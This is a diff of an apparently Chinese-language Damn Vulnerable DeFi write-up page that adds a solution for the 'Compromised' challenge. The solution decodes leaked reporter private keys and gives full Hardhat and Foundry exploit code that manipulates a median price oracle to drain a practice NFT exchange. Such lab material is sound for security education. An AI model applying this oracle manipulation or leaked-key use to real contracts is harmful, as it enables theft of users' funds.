@@ -2728,6 +2728,46 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#7-compromised" class="md-nav__link">
+    7. Compromised
+  </a>
+  
+    <nav class="md-nav" aria-label="7. Compromised">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_4" class="md-nav__link">
+    Exploit
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hardhat_2" class="md-nav__link">
+    Hardhat
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#foundry_2" class="md-nav__link">
+    Foundry
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3058,6 +3098,46 @@
         
           <li class="md-nav__item">
   <a href="#foundry_1" class="md-nav__link">
+    Foundry
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-compromised" class="md-nav__link">
+    7. Compromised
+  </a>
+  
+    <nav class="md-nav" aria-label="7. Compromised">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_4" class="md-nav__link">
+    Exploit
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hardhat_2" class="md-nav__link">
+    Hardhat
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#foundry_2" class="md-nav__link">
     Foundry
   </a>
   
@@ -3604,7 +3684,7 @@ $<span class="w"> </span>forge<span class="w"> </span>remappings
 </code></pre></div>
 </li>
 <li>
-<p>创建新的 action 需要创建者获取足够的票数，票数即创建者在上一快照 <code>governanceToken</code> 的持有量</p>
+<p>创建新的 action 需要创建者获取足够的票数，票数即创建者在最新快照 <code>governanceToken</code> 的持有量</p>
 <div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">queueAction</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">uint128</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">actionId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">_hasEnoughVotes</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">))</span>
 <span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">NotEnoughVotes</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
@@ -3708,13 +3788,133 @@ $<span class="w"> </span>forge<span class="w"> </span>remappings
 <span class="w">    </span><span class="nx">governance</span><span class="p">.</span><span class="nx">executeAction</span><span class="p">(</span><span class="nx">actionId</span><span class="p">);</span>
 <span class="p">}</span>
 </code></pre></div>
+<h2 id="7-compromised">7. Compromised<a class="headerlink" href="#7-compromised" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code>HTTP/2 200 OK
+content-type: text/html
+content-language: en
+vary: Accept-Encoding
+server: cloudflare
+
+4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+</code></pre></div>
+<blockquote>
+<p>A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.</p>
+<p>This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c.</p>
+<p>Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.</p>
+</blockquote>
+<ul>
+<li>对返回数据先十六进制解码再 Base64 解码得到其中两个 reporter 的私钥</li>
+<li>
+<p>DVNFT 的价格取决于 reporters 提供价格的中位数</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">getMedianPrice</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">symbol</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_computeMedianPrice</span><span class="p">(</span><span class="nx">symbol</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">_computeMedianPrice</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">symbol</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">prices</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getAllPricesForSymbol</span><span class="p">(</span><span class="nx">symbol</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">LibSort</span><span class="p">.</span><span class="nx">insertionSort</span><span class="p">(</span><span class="nx">prices</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">prices</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">leftPrice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">prices</span><span class="p">[(</span><span class="nx">prices</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">2</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">];</span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">rightPrice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">prices</span><span class="p">[</span><span class="nx">prices</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">2</span><span class="p">];</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">leftPrice</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">rightPrice</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">prices</span><span class="p">[</span><span class="nx">prices</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">2</span><span class="p">];</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">getAllPricesForSymbol</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">symbol</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">prices</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">numberOfSources</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getRoleMemberCount</span><span class="p">(</span><span class="nx">TRUSTED_SOURCE_ROLE</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">prices</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">uint256</span><span class="p">[](</span><span class="nx">numberOfSources</span><span class="p">);</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">numberOfSources</span><span class="p">;)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">source</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getRoleMember</span><span class="p">(</span><span class="nx">TRUSTED_SOURCE_ROLE</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">prices</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getPriceBySource</span><span class="p">(</span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">source</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">unchecked</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">++</span><span class="nx">i</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">getPriceBySource</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">source</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_pricesBySource</span><span class="p">[</span><span class="nx">source</span><span class="p">][</span><span class="nx">symbol</span><span class="p">];</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>在持有两个 reporters 私钥的情况下可以很轻松地操控价格</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">postPrice</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">newPrice</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyRole</span><span class="p">(</span><span class="nx">TRUSTED_SOURCE_ROLE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">_setPrice</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">newPrice</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>先降低价格购买 NFT，再提高价格卖出</p>
+</li>
+</ul>
+<h3 id="exploit_4">Exploit<a class="headerlink" href="#exploit_4" title="Permanent link">&para;</a></h3>
+<h4 id="hardhat_2">Hardhat<a class="headerlink" href="#hardhat_2" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">resp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s1">&#39;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&#39;</span><span class="p">,</span>
+<span class="w">        </span><span class="s1">&#39;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="p">];</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">signers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">signers</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">Wallet</span><span class="p">(</span>
+<span class="w">            </span><span class="nx">Buffer</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">resp</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">),</span><span class="w"> </span><span class="s1">&#39;hex&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">),</span><span class="w"> </span><span class="s1">&#39;base64&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">),</span>
+<span class="w">            </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">provider</span>
+<span class="w">        </span><span class="p">));</span>
+<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">oracle</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">signers</span><span class="p">[</span><span class="nx">i</span><span class="p">]).</span><span class="nx">postPrice</span><span class="p">(</span><span class="s1">&#39;DVNFT&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// get tokenId from the event</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">tx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">exchange</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">player</span><span class="p">).</span><span class="nx">buyOne</span><span class="p">({</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="p">});</span><span class="w"> </span><span class="c1">// (msg.value - price) will be send back</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">receipt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">wait</span><span class="p">();</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">receipt</span><span class="p">.</span><span class="nx">events</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span>
+<span class="w">        </span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="k">return</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">event</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;TokenBought&quot;</span><span class="p">}</span>
+<span class="w">        </span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">args</span><span class="p">.</span><span class="nx">tokenId</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">oracle</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">signers</span><span class="p">[</span><span class="nx">i</span><span class="p">]).</span><span class="nx">postPrice</span><span class="p">(</span><span class="s1">&#39;DVNFT&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">EXCHANGE_INITIAL_ETH_BALANCE</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">nftToken</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">player</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">exchange</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">id</span><span class="p">);</span>
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">exchange</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">player</span><span class="p">).</span><span class="nx">sellOne</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div>
+<h4 id="foundry_2">Foundry<a class="headerlink" href="#foundry_2" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">address</span><span class="p">[](</span><span class="mf">2</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">users</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vm</span><span class="p">.</span><span class="nx">addr</span><span class="p">(</span><span class="mh">0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">users</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vm</span><span class="p">.</span><span class="nx">addr</span><span class="p">(</span><span class="mh">0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint8</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">users</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
+<span class="w">        </span><span class="nx">oracle</span><span class="p">.</span><span class="nx">postPrice</span><span class="p">(</span><span class="s1">&#39;DVNFT&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">attacker</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exchange</span><span class="p">.</span><span class="nx">buyOne</span><span class="p">{</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="p">}();</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint8</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">users</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
+<span class="w">        </span><span class="nx">oracle</span><span class="p">.</span><span class="nx">postPrice</span><span class="p">(</span><span class="s1">&#39;DVNFT&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">EXCHANGE_INITIAL_ETH_BALANCE</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">attacker</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">nftToken</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">exchange</span><span class="p">),</span><span class="w"> </span><span class="nx">id</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">exchange</span><span class="p">.</span><span class="nx">sellOne</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年4月2日 21:50:04</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年4月3日 10:03:40</span>
       
     
   </small>
